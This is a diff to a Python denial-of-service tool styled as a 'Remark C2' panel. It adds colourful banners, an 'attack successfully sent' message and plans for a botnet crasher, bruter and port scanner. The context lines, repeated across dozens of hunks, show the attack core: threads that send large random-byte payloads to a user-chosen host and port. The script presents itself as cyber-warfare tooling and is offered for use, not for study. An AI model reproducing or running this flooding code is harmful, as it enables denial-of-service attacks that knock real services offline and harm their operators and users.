@@ -11,6 +11,15 @@ import urllib
 import json
 nicknm = "EskaX"
 
+
+#future plans
+#============
+#Add specific Attack messages for different vector Attacks
+#Add tools section (will include: botnet crasher, botnet bruter, pinger, port scanner, etc)
+#Add Loading Animations
+#Add 
+
+
 user = """
 				   ╔═════════════════════════════╗
 				   ║     Welcome To Remark 25    ║
@@ -46,6 +55,20 @@ token = """
 			  ║      Licensed under GPU V3.0        ║
 			  ║  FOR ALLOWED USE IN 'CYBER-WARFARE' ║
 			  ╚═════════════════════════════════════╝
+"""
+
+attak = """
+                   [95m╔═════════════════════════════╗
+				   [95m║    [92mAttack has successfully  [95m╚════════════════════════════════╗
+				   [95m║           [91mBeen sent         [95m║			Made by				  [95m║
+				   [95m║[91mFor attack info see other box[95m║       Eskax  &   Flippy        [95m║
+				   [95m╚══════════════════════════╗[95m══╝                                [95m║
+			                                  [95m║                 [95m╔═════════════════════════════════════╗
+			                                  [95m║                 [95m║     [91mNetwork [91mPercentaged Uses: [96m0.4%   [95m║
+			                                  [95m╚═════════════════╝      [91mBandwith [91mUsed[95m:  [96m6-7%             [95m║
+			                                                    [95m║  [92mAttack Succesfully timed out target [95m║
+			                                                    [95m╚═════════════════════════════════════╝
+
 """
 
 captcha = """
@@ -237,8 +260,29 @@ path = """
 """
 
 banner =  """
-  The Power to 
-OverWhelm and destroy
+[95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗[95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗
+   [95m║ [91mWelcome To The Remark [96mC2 Main Screen[95m.     [95m║[95m║  [91mProject Remark.                [95m║
+   [95m║ [91mTill We Fall[96m. [95m2022. [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m╝╚╗ [91mPrivate Developer's Edition.   [95m║
+   ╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m╝[95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗  [91mBuild 44[96m.       [95m║
+   [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ [95m║   [91mFlippy [96m& [91mEskaX    [95m║[95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗ ╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m╝
+   [95m║   [91mC2 [96mX [91mSubstrate   [95m║ [95m║ [91mCapabilities Exceed.[95m║[95m║   [96mXVII[95m.   [95m║ [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗
+   ╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m╝ ╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m╝╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m╝ [95m║  [91m                [95m║
+   [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗[95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m╝                  [95m║
+   [95m║ [91mSTATE.......: [91mPRIVATE      [95m║[95m║                                                [95m║
+   [95m║ [91mHYPERPOWER..: [91mXVII         [95m║[95m║                                                [95m║
+   [95m║ [91mVERSION.....: [91mB44          [95m║[95m║                                                [95m║
+   [95m║ [91mSCKET_INT...: [91mINSTNC IV    [95m║[95m║             [91m┬─┐┌─┐┌┬┐┌─┐┬─┐┬┌─                 [95m║
+   [95m║ [91mLSC.........: [91mGL3.0        [95m║[95m║             [91m├┬┘├┤ │││├─┤├┬┘├┴┐                 [95m║
+   [95m║ [91mDESC........: [91mC2XTLNT      [95m║[95m║             [91m┴└─└─┘┴ ┴┴ ┴┴└─┴ ┴                 [95m║
+   [95m║ [91mALGORITHM...: [91mAES-512      [95m║[95m║               [91mEskax [96m& [91mFlippy                   [95m║
+   [95m║ [91mPRJ-VAS.....: [91m84-34-243    [95m║[95m║                                                [95m║
+   [95m║ [91mCCR.........: [91mXX-3345-24   [95m║[95m║                                                [95m║
+   [95m║ [91mDATA_TRMIT..: [91mACTIVE       [95m║[95m║                                                [95m║
+   [95m║ [91mSRVERS_ON...: [91m3            [95m║[95m║                                                [95m║
+   ╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m╝╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m╝
+   [95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗[95m╔[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═╗
+   [95m║ [91mLast Update - [21/04/2020] [95m║[95m║      [91mMyra Network System Status: Active [96m!      [95m║
+   ╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m╝╚[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m═[95m╝
 """
 
 
@@ -390,7 +434,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -406,7 +450,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -422,7 +466,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -438,7 +482,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -454,7 +498,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -470,7 +514,7 @@ def main():
 					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -486,7 +530,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -502,7 +546,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -518,7 +562,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -534,7 +578,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -550,7 +594,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -566,7 +610,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -582,7 +626,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -598,7 +642,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -614,7 +658,7 @@ def main():
 					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -631,7 +675,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -647,7 +691,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -663,7 +707,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -679,7 +723,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -695,7 +739,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -711,7 +755,7 @@ def main():
 					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -727,7 +771,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -743,7 +787,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -759,7 +803,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -775,7 +819,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -791,7 +835,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -807,7 +851,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -823,7 +867,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -839,7 +883,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -855,7 +899,7 @@ def main():
 					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -871,7 +915,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -887,7 +931,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -903,7 +947,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -919,7 +963,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -935,7 +979,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -951,7 +995,7 @@ def main():
 					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -967,7 +1011,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -983,7 +1027,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -999,7 +1043,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1015,7 +1059,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1031,7 +1075,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1047,7 +1091,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1063,7 +1107,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1079,7 +1123,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1095,7 +1139,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1111,7 +1155,7 @@ def main():
 					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1127,7 +1171,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1143,7 +1187,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1159,7 +1203,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1175,7 +1219,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1191,7 +1235,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1207,7 +1251,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1223,7 +1267,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1239,7 +1283,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1255,7 +1299,7 @@ def main():
 					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1272,7 +1316,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1288,7 +1332,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1304,7 +1348,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1320,7 +1364,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1336,7 +1380,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1352,7 +1396,7 @@ def main():
 					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1368,7 +1412,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1384,7 +1428,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1400,7 +1444,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1416,7 +1460,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1432,7 +1476,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1448,7 +1492,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1464,7 +1508,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1480,7 +1524,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1496,7 +1540,7 @@ def main():
 					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1512,7 +1556,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1528,7 +1572,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1544,7 +1588,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1560,7 +1604,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1576,7 +1620,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1592,7 +1636,7 @@ def main():
 					pack = 6550055162
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1608,7 +1652,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1624,7 +1668,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1640,7 +1684,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1656,7 +1700,7 @@ def main():
 					pack = 65500
 					punch = random._urandom(int(pack))
 					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
-					print("\033[97mYour Attack Has Been Launched!")
+					print(attak)
 			except ValueError:
 				main()
 			except socket.gaierror:
@@ -1672,7 +1716,7 @@ def main():
